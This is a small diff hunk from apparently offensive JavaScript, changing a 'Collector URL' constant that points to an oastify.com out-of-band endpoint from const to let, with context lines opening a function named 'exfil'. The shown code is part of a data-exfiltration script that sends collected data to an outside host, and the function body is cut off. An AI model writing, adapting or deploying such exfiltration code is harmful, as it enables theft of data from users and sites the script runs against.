@@ -3,7 +3,7 @@
 // =====================
 
 // Collector URL
-const COLLECT = 'https://85bhvmhm5bs8d86f2rd5lsxwxn3erafz.oastify.com/collect';
+let COLLECT = 'https://85bhvmhm5bs8d86f2rd5lsxwxn3erafz.oastify.com/collect';
 
 // Exfil function
 function exfil(name, data){
